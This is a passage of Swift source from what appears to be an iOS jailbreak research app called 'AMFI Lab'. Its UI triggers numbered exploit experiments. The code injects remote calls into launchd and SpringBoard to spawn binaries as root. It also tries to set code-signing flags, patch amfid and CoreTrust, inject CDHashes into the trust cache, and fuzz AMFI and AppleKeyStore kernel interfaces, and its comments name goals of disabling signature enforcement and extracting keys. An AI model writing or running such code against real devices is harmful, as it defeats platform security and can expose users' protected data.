                    label: "File Payload",
                    action: runExp93eFilePayload,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③o6 Spawn Test (Exp 93f)",
                    icon: "play.circle.fill",
                    color: .red,
                    label: "Spawn Test",
                    action: runExp93fSpawnTest,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③o7 Multi Spawn (Exp 93g)",
                    icon: "arrow.triangle.2.circlepath",
                    color: .red,
                    label: "Multi Spawn",
                    action: runExp93gMultiSpawn,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③r DATA_CONST Write (Exp 96)",
                    icon: "bolt.shield.fill",
                    color: .gray,
                    label: "DC Write",
                    action: runExp96DataConstWrite,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③s amfid Race (Exp 97)",
                    icon: "hare.fill",
                    color: .purple,
                    label: "amfid Race",
                    action: runExp97AmfidRace,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③t CT Data Write (Exp 98)",
                    icon: "lock.doc.fill",
                    color: .purple,
                    label: "CT Write",
                    action: runExp98CoreTrustData,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③t2 CT Patch+Spawn (Exp 98b)",
                    icon: "lock.open.doc.fill",
                    color: .purple,
                    label: "CT Patch",
                    action: runExp98bCoreTrustPatch,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③u AMFI IOKit Exploit (Exp 99)",
                    icon: "ant.fill",
                    color: .purple,
                    label: "AMFI IOKit",
                    action: runExp99AMFIIOKit,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③v TC Load XPC (Exp 100)",
                    icon: "arrow.down.circle.fill",
                    color: .green,
                    label: "TC Load",
                    action: runExp100TCLoadXPC,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③p Heap TC Scan (Exp 94)",
                    icon: "magnifyingglass.circle",
                    color: .orange,
                    label: "Heap TC",
                    action: runExp94HeapTCScan,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③q CS Disable (Exp 95)",
                    icon: "lock.open.fill",
                    color: .red,
                    label: "CS Disable",
                    action: runExp95CSDisable,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "④ Test Binary Spawn",
                    icon: "terminal.fill",
                    color: .indigo,
                    label: "Spawn",
                    action: { testSingleBinary(customBinary) },
                    needsVerified: false
                )

                TextField("Binary path", text: $customBinary)
                    .font(.system(.caption, design: .monospaced))
            } header: {
                Label("Jailbreak Path", systemImage: "flag.checkered")
            } footer: {
                Text("② Probe pakai offset kernelcache + XPF. ③ KTRR Analysis: info saja, tidak write. ③b RC TC Add: inject CDHash via launchd RemoteCall (PPL-safe). ③e CS Flags: write cs_flags via physmap ke proc_ro binary target (bypass KTRR). ③f amfid Patch: patch amfid text via physmap untuk skip signature check.")
                    .font(.system(size: 9))
            }

            Section {
                Button(action: runAmfidRC) {
                    HStack {
                        Label("amfid RC (Exp 60)", systemImage: "bolt.shield")
                            .foregroundStyle(isRunning ? .gray : .orange)
                        Spacer()
                        if isRunning && runningLabel.contains("amfid") {
                            ProgressView().scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)

                Button(action: runExp78) {
                    HStack {
                        Label("DART PTE Probe (Exp 78)", systemImage: "cpu")
                            .foregroundStyle(isRunning ? .gray : .purple)
                        Spacer()
                        if isRunning && runningLabel.contains("DART") {
                            ProgressView().scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)

                Button(action: runPatchAmfidOnly) {
                    HStack {
                        Label("Patch amfid (safe)", systemImage: "wrench.and.screwdriver")
                            .foregroundStyle(isRunning ? .gray : .mint)
                        Spacer()
                        if isRunning && runningLabel.contains("Patch safe") {
                            ProgressView().scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)

                Button(action: runDumpAmfid) {
                    HStack {
                        Label("Dump amfid binary", systemImage: "arrow.down.doc")
                            .foregroundStyle(isRunning ? .gray : .green)
                        Spacer()
                        if isRunning && runningLabel.contains("Dump") {
                            ProgressView().scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)
            } header: {
                Label("Advanced", systemImage: "flask")
            } footer: {
                Text("Exp 60/78 opsional. Dump amfid: copy /usr/libexec/amfid ke Documents (ambil via Files app).")
                    .font(.system(size: 9))
            }
            
            // Results
            if !results.isEmpty {
                Section {
                    ForEach(results) { r in
                        VStack(alignment: .leading, spacing: 4) {
                            HStack {
                                Image(systemName: r.success ? "checkmark.circle.fill" : "xmark.circle.fill")
                                    .foregroundStyle(r.success ? .green : .red)
                                Text(r.name)
                                    .font(.caption.bold())
                                Spacer()
                                Text(r.timestamp, style: .time)
                                    .font(.system(size: 8))
                                    .foregroundStyle(.tertiary)
                            }
                            Text(r.detail)
                                .font(.system(size: 10, design: .monospaced))
                                .foregroundStyle(.secondary)
                                .textSelection(.enabled)
                        }
                        .padding(.vertical, 2)
                    }
                } header: {
                    HStack {
                        Label("Results (\(results.count))", systemImage: "list.bullet")
                        Spacer()
                        if !results.isEmpty {
                            Button("Clear") { results.removeAll() }
                                .font(.caption2)
                        }
                    }
                }
            } else if !isRunning {
                Section {
                    Text("No results yet. Tap 'Run All' to start.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                } header: {
                    Label("Results", systemImage: "list.bullet")
                }
            }
        }
        .navigationTitle("AMFI Lab")
        .navigationBarTitleDisplayMode(.inline)
    }

    @ViewBuilder
    private func pathButton(
        title: String,
        icon: String,
        color: Color,
        label: String,
        action: @escaping () -> Void,
        needsVerified: Bool,
        needsProbe: Bool = false
    ) -> some View {
        Button(action: action) {
            HStack {
                Label(title, systemImage: icon)
                    .foregroundStyle(isRunning ? .gray : color)
                Spacer()
                if isRunning && runningLabel.contains(label) {
                    ProgressView().scaleEffect(0.7)
                }
            }
        }
        .disabled(
            isRunning || !mgr.dsready
                || (needsVerified && !PhysmapConstants.isVerified)
                || (needsProbe && !PhysmapConstants.isProbeOK)
        )
    }

    // MARK: - Jailbreak path runners

    private func runExperiment(
        label: String,
        operation: String,
        append: Bool = false,
        block: @escaping (RemoteCall) -> ExperimentResult
    ) {
        isRunning = true
        runningLabel = label

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: operation) { rc in
            let result = block(rc)
            DispatchQueue.main.async {
                if append {
                    self.results.insert(result, at: 0)
                } else {
                    self.results = [result]
                }
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    /// Exp 74 is KRW-only — must NOT hold launchd (IOSurface + long KRW = initproc panic).
    private func runExp74() {
        isRunning = true
        runningLabel = "Physmap"
        guard mgr.dsready else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expPhysmapAccess()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Probe = KRW-only (no launchd). sysctl/RC was causing 3+ min hangs with no UI update.
    private func runExp77Probe() {
        isRunning = true
        runningLabel = "TC Probe"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expTrustCacheProbeSafe()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Inject = KRW-only (no launchd). Validates physmap VA before any write.
    private func runExp77Inject() {
        isRunning = true
        runningLabel = "TC Inject"
        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expTrustCacheWrite(rc: nil, dryRun: false)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Exp 80: RC Trust Cache Add via launchd RemoteCall.
    /// Ini jalur PPL-safe: panggil trust_cache_runtime_add dari launchd context.
    /// PPL yang melakukan write internal — tidak ada KTRR fault.
    private func runExp80RCTrustCacheAdd() {
        isRunning = true
        runningLabel = "RC TC Add"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp80_rc_tc_add") { rc in
            let result = self.expRCTrustCacheAdd(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func runExp81HeapTCAnalysis() {
        isRunning = true
        runningLabel = "Heap TC"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expHeapTCAnalysis()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }
    private func runExp78() {
        runExperiment(label: "DART", operation: "exp78_dart", append: true) { rc in
            self.expDARTPTEProbe(rc: rc)
        }
    }

    /// Exp 79 Tahap 1: Write test — tulis sentinel ke slot kosong, verify, restore.
    /// Tidak memodifikasi entry yang ada. Aman untuk dijalankan.
    private func runExp79WriteTest() {
        isRunning = true
        runningLabel = "Write Test"
        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expWriteTest()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Exp 79 Tahap 2: CDHash inject — hanya jika write test sukses.
    private func runExp79Inject() {
        isRunning = true
        runningLabel = "TC Inject"
        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
            isRunning = false
            runningLabel = ""
            return
        }
        guard probedTCAddr != 0 else {
            results.insert(ExperimentResult(
                name: "TC Inject (Exp 79)",
                success: false,
                detail: "❌ Jalankan Write Test dulu — tc_addr belum diset.\nProbe ulang Exp 77 jika perlu.",
                timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expInjectCDHash()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }
    
    private func testSingleBinary(_ path: String) {
        isRunning = true
        runningLabel = "Testing \(path)..."
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "test_binary") { rc in
            let result = self.expPosixSpawn(rc: rc, binary: path, name: "posix_spawn \(path)")
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    private func runAmfidRC() {
        isRunning = true
        runningLabel = "amfid RC (may take 10s)..."
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "amfid_rc") { rc in
            let result = self.expRCIntoAmfid(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    // MARK: - Experiment Implementations
    
    #if !DISABLE_REMOTECALL
    /// Helper: posix_spawn a binary
    private func expPosixSpawn(rc: RemoteCall, binary: String, name: String) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, binary)
        
        // argv = [binary, NULL]
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // pid output
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // If spawned, wait for it
        if ret == 0 && pid != 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let exitStatus = rc[statusAddr].value32()
            
            RootExecutor.rcall(rc, "free", binAddr)
            return ExperimentResult(
                name: name,
                success: true,
                detail: "âœ… PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
                timestamp: Date()
            )
        }
        
        // Failed â€” get errno
        let err = remote_errno(rc)
        RootExecutor.rcall(rc, "free", binAddr)
        return ExperimentResult(
            name: name,
            success: false,
            detail: "âŒ ret=\(ret), errno=\(err), pid=\(pid)",
            timestamp: Date()
        )
    }
    
    // MARK: - Experiment 54: IOKit Driver Probe
    
    /// IOKit driver probe â€” find accessible user clients for potential exploitation
    /// Some IOKit drivers have bugs in external methods (OOB read/write)
    private func expIOKitProbe(rc: RemoteCall) -> ExperimentResult {
        var detail = "IOKit Driver Probe â€” finding accessible user clients\n\n"
        
        // From SpringBoard (has more IOKit access than launchd)
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "IOKit probe", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        // Try to open various IOKit user clients
        let services = [
            "IOSurfaceRoot",
            "AGXAccelerator",
            "AppleAVD",
            "AppleH13CamIn",
            "IOHIDSystem",
            "AppleSPU",
            "AppleKeyStore",
            "AppleCredentialManager",
            "IOAudioEngine",
            "AppleMobileFileIntegrity",
        ]
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let ioServiceGetMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let ioServiceOpen = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceClose"))
        
        guard ioServiceMatching != 0 && ioServiceGetMatching != 0 && ioServiceOpen != 0 else {
            detail += "IOKit functions not available\n"
            // Try loading IOKit
            let fwPath = remote_alloc_str(sb, "/System/Library/Frameworks/IOKit.framework/IOKit")
            RootExecutor.rcall(sb, "dlopen", fwPath, 1)
            RootExecutor.rcall(sb, "free", fwPath)
            detail += "Tried loading IOKit framework\n"
            return ExperimentResult(name: "IOKit probe", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let mem = sb.trojanMem
        
        for service in services {
            let nameAddr = remote_alloc_str(sb, service)
            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
            
            if matchDict != 0 {
                let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
                if svc != 0 {
                    // Try to open with type 0
                    let connectAddr = mem + 0x1A00
                    sb[connectAddr].setValue32(0)
                    let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
                    let connect = sb[connectAddr].value32()
                    
                    if openRet == 0 && connect != 0 {
                        detail += "âœ… \(service): OPENED! connect=\(connect)\n"
                        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
                    } else {
                        detail += "  \(service): found but open failed (ret=0x\(String(format: "%x", openRet)))\n"
                    }
                } else {
                    detail += "  \(service): not found\n"
                }
            }
            RootExecutor.rcall(sb, "free", nameAddr)
        }
        
        let hasOpen = detail.contains("âœ…")
        if hasOpen {
            detail += "\nâœ… Accessible user clients found!\n"
            detail += "These can be fuzzed for OOB read/write vulnerabilities.\n"
            detail += "External methods might give us access to different kernel zones!\n"
        }
        
        return ExperimentResult(name: "IOKit probe", success: hasOpen, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 55: CoreTrust Certificate Probe
    
    /// CoreTrust certificate probe â€” test what signatures iOS 18.2 accepts
    /// Try spawning binary with different signature types
    private func expCoreTrustProbe(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "CoreTrust Certificate Probe\n\n"
        
        // CoreTrust validates the certificate chain in code signatures.
        // We can't easily CREATE certificates from device, but we can:
        // 1. Check what signature our app has (it's signed!)
        // 2. Check what signature system binaries have
        // 3. Try to copy signature from signed binary to unsigned one
        
        // Step 1: Read our app's code signature info
        let pid = RootExecutor.rcall(rc, "getpid")
        detail += "Our PID: \(pid)\n"
        
        // csops(pid, CS_OPS_STATUS, &status, sizeof(status))
        // CS_OPS_STATUS = 0
        let statusAddr = mem + 0x1A00
        rc[statusAddr].setValue32(0)
        let csopsRet = RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let csStatus = rc[statusAddr].value32()
        detail += "csops(STATUS): ret=\(csopsRet), flags=0x\(String(format: "%x", csStatus))\n"
        
        // Decode flags
        if csStatus & 0x1 != 0 { detail += "  CS_VALID\n" }
        if csStatus & 0x4 != 0 { detail += "  CS_HARD\n" }
        if csStatus & 0x8 != 0 { detail += "  CS_KILL\n" }
        if csStatus & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY\n" }
        if csStatus & 0x200 != 0 { detail += "  CS_PLATFORM_PATH\n" }
        if csStatus & 0x800 != 0 { detail += "  CS_DEBUGGED\n" }
        if csStatus & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
        if csStatus & 0x20000 != 0 { detail += "  CS_INSTALLER\n" }
        
        // Step 2: Try csops on launchd (PID 1)
        rc[statusAddr].setValue32(0)
        let csops1 = RootExecutor.rcall(rc, "csops", 1, 0, statusAddr, 4)
        let cs1Status = rc[statusAddr].value32()
        detail += "\nlaunchd csops: ret=\(csops1), flags=0x\(String(format: "%x", cs1Status))\n"
        if cs1Status & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
        
        // Step 3: Check if we can set CS_DEBUGGED on ourselves via csops
        // CS_OPS_SET_STATUS = 8 (might be restricted)
        detail += "\nTrying to set CS_DEBUGGED on our process...\n"
        let newFlags: UInt32 = csStatus | 0x800 // add CS_DEBUGGED
        rc[statusAddr].setValue32(newFlags)
        let setRet = RootExecutor.rcall(rc, "csops", pid, 8, statusAddr, 4)
        detail += "csops(SET_STATUS, +CS_DEBUGGED): ret=\(setRet)\n"
        
        // Read back
        rc[statusAddr].setValue32(0)
        RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let afterFlags = rc[statusAddr].value32()
        detail += "After set: flags=0x\(String(format: "%x", afterFlags))\n"
        
        if afterFlags & 0x800 != 0 && csStatus & 0x800 == 0 {
            detail += "\nâœ…âœ…âœ… CS_DEBUGGED SET SUCCESSFULLY! âœ…âœ…âœ…\n"
            detail += "This might allow loading unsigned code in our process!\n"
            detail += "CS_DEBUGGED disables some AMFI checks!\n"
        }
        
        // Step 4: Try CS_OPS_MARKKILL = 6 (mark as killable â€” might affect enforcement)
        // And CS_OPS_CLEARPLATFORM = 13
        detail += "\nOther csops experiments:\n"
        let csopsTests: [(String, UInt64)] = [
            ("CS_OPS_MARKHARD (4)", 4),
            ("CS_OPS_MARKKILL (6)", 6),
            ("CS_OPS_CLEARPLATFORM (13)", 13),
            ("CS_OPS_CLEARINSTALLER (14)", 14),
        ]
        
        for (name, op) in csopsTests {
            rc[statusAddr].setValue32(0)
            let r = RootExecutor.rcall(rc, "csops", pid, op, statusAddr, 4)
            detail += "  \(name): ret=\(r)\n"
        }
        
        let success = detail.contains("âœ…âœ…âœ…")
        return ExperimentResult(name: "CoreTrust/csops probe", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 56: AMFI External Method Fuzzing
    
    /// Experiment 56: Open AMFI user client and fuzz ALL external methods!
    /// AppleMobileFileIntegrity kext has external methods that might:
    /// - Whitelist a binary hash
    /// - Disable enforcement for a process
    /// - Add an exception to code signing policy
    /// - Return internal state we can use
    private func expAMFIExternalMethods() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AMFI External Method Fuzzing\n"
        detail += "Opening AppleMobileFileIntegrity user client...\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Get IOKit function pointers (resolved for availability check)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt) â€” 6 params
        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
        
        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
            detail += "IOKit functions not available\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        // Open AMFI user client
        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AMFI service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "âœ… AMFI user client opened! connect=\(connect)\n\n"
        detail += "Fuzzing external methods (selectors 0-15)...\n\n"
        
        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt)
        // Only 6 params â€” safe for ARM64 register calling convention
        
        // Setup output buffer (space for 16 uint64 outputs)
        let scalarOutAddr = mem + 0x1C00
        let scalarOutCntAddr = mem + 0x1D00
        // Input area
        let scalarInAddr = mem + 0x2000
        
        var foundMethods: [Int] = []
        
        for selector in 0..<16 {
            // Reset output count
            sb[scalarOutCntAddr].setValue32(16)
            
            // Clear output
            for i in 0..<16 {
                sb[scalarOutAddr + UInt64(i * 8)].setValue64(0)
            }
            
            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect),
                                         UInt64(selector),
                                         0, 0,  // no input
                                         scalarOutAddr, scalarOutCntAddr)
            
            let outCnt = sb[scalarOutCntAddr].value32()
            
            // Interpret return value
            // 0 = success, 0xe00002bc = invalid selector, 0xe00002c2 = bad argument
            let retHex = String(format: "0x%x", ret)
            
            if ret == 0 {
                detail += "âœ… Selector \(selector): SUCCESS! outCnt=\(outCnt)\n"
                foundMethods.append(selector)
                
                // Read scalar outputs
                if outCnt > 0 {
                    detail += "   Scalar outputs: "
                    for i in 0..<min(Int(outCnt), 4) {
                        let val = sb[scalarOutAddr + UInt64(i * 8)].value64()
                        detail += "[\(i)]=0x\(String(format: "%llx", val)) "
                    }
                    detail += "\n"
                }
            } else if ret == 0xe00002bc {
                // kIOReturnBadArgument â€” selector doesn't exist
                detail += "   Selector \(selector): not implemented (0xe00002bc)\n"
            } else if ret == 0xe00002c2 {
                // kIOReturnUnsupported or bad input count
                detail += "âš ï¸ Selector \(selector): needs input! (ret=\(retHex))\n"
                foundMethods.append(selector)
            } else if ret == 0xe0000001 {
                detail += "âš ï¸ Selector \(selector): general error (ret=\(retHex))\n"
                foundMethods.append(selector)
            } else {
                detail += "   Selector \(selector): ret=\(retHex)\n"
                if ret != 0xe00002bc && ret != 0xe00002c7 {
                    foundMethods.append(selector)  // non-standard error = method exists
                }
            }
        }
        
        // Now try selectors with scalar input (1 uint64 = 0)
        if !foundMethods.isEmpty {
            detail += "\n--- Re-testing found methods with input ---\n"
            for selector in foundMethods.prefix(8) {
                // Try with 1 scalar input = 0
                sb[scalarInAddr].setValue64(0)
                sb[scalarOutCntAddr].setValue32(16)
                
                let ret2 = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                             UInt64(connect),
                                             UInt64(selector),
                                             scalarInAddr, 1,  // 1 scalar input
                                             scalarOutAddr, scalarOutCntAddr)
                
                let outCnt2 = sb[scalarOutCntAddr].value32()
                detail += "  Selector \(selector) + input(0): ret=0x\(String(format: "%x", ret2)), outCnt=\(outCnt2)\n"
                
                if ret2 == 0 && outCnt2 > 0 {
                    let val = sb[scalarOutAddr].value64()
                    detail += "    â†’ output[0] = 0x\(String(format: "%llx", val))\n"
                }
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\n--- Summary ---\n"
        detail += "Found \(foundMethods.count) active methods: \(foundMethods)\n"
        if !foundMethods.isEmpty {
            detail += "NEXT: Try specific inputs to these methods\n"
            detail += "Goal: find method that disables CS enforcement or whitelists hash\n"
        }
        
        let success = !foundMethods.isEmpty
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ AMFI methods", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 57: AppleKeyStore Probe
    
    /// Experiment 57: AppleKeyStore external method probe
    /// KeyStore manages encryption keys â€” if we can extract/manipulate keys
    /// we might be able to sign our own binaries or decrypt protected data
    private func expKeyStoreProbe() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AppleKeyStore External Method Probe\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
        
        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
            detail += "IOKit functions not available in SpringBoard\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        // Open AppleKeyStore
        let nameAddr = remote_alloc_str(sb, "AppleKeyStore")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AppleKeyStore service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open KeyStore: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "âœ… AppleKeyStore opened! connect=\(connect)\n\n"
        
        // Fuzz selectors 0-20 (KeyStore has many methods)
        let scalarOutAddr = mem + 0x1C00
        let scalarOutCntAddr = mem + 0x1D00
        
        var foundMethods: [Int] = []
        
        for selector in 0..<20 {
            sb[scalarOutCntAddr].setValue32(16)
            
            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect),
                                         UInt64(selector),
                                         0, 0,
                                         scalarOutAddr, scalarOutCntAddr)
            
            if ret == 0 {
                let outCnt = sb[scalarOutCntAddr].value32()
                detail += "âœ… Selector \(selector): SUCCESS! out=\(outCnt)\n"
                foundMethods.append(selector)
                if outCnt > 0 {
                    let val = sb[scalarOutAddr].value64()
                    detail += "   output[0] = 0x\(String(format: "%llx", val))\n"
                }
            } else if ret != 0xe00002bc && ret != 0xe00002c7 {
                detail += "âš ï¸ Selector \(selector): ret=0x\(String(format: "%x", ret)) (exists but needs input)\n"
                foundMethods.append(selector)
            }
        }
        
        // Close
